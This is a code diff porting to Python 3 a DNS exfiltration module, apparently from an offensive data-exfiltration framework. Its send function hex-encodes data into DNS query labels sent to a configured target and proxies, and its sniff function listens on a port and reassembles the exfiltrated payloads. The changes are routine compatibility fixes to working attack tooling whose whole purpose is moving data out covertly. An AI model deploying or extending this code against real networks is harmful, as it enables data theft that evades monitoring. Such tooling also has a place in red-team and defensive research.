@@ -1,4 +1,5 @@
 from __future__ import print_function
+from binascii import hexlify, unhexlify
 from dnslib import DNSRecord
 import socket
 from dpkt import dns
@@ -26,7 +27,7 @@ def handle_dns_query(qname):
             last_label_len = (252 - len(config['key'])) % 64
             max_query = 252 if last_label_len == 1 else 253
             if (len(qname) < max_query):
-                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
+                app_exfiltrate.retrieve_data(unhexlify(''.join(buf[jobid])).decode())
                 buf[jobid] = []
     except Exception as e:
         # print(e)
@@ -46,14 +47,17 @@ def relay_dns_query(domain):
 def sniff(handler):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     IP = "0.0.0.0"
-    PORT = 53
+    PORT = config['port']
     sock.bind((IP, PORT))
     while True:
         try:
             data, addr = sock.recvfrom(65536)
-            query = dns.DNS(data)
-            for qname in query.qd:
-                handler(qname.name + '.')
+            try:
+                query = dns.DNS(data)
+                for qname in query.qd:
+                    handler(qname.name + '.')
+            except:
+                pass
         except:
             sock.shutdown()
             sock.close()
@@ -62,19 +66,19 @@ def sniff(handler):
 #Max query is 253 characters long (textual representation)
 #Max label length is 63 bytes
 def send(data):
-    if config.has_key('proxies') and config['proxies'] != [""]:
+    if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
     else:
         targets = [config['target']]
     port = config['port']
     jobid = data.split("|!|")[0]
-    data = data.encode('hex')
+    data = hexlify(data.encode()).decode()
     domain = ""
 
     #Calculate the remaining length available for our payload
     rem = 252 - len(config['key'])
     #Number of 63 bytes labels
-    no_labels = rem / 64 #( 63 + len('.') )
+    no_labels = rem // 64 #( 63 + len('.') )
     #Length of the last remaining label
     last_label_len = (rem % 64) - 1
 
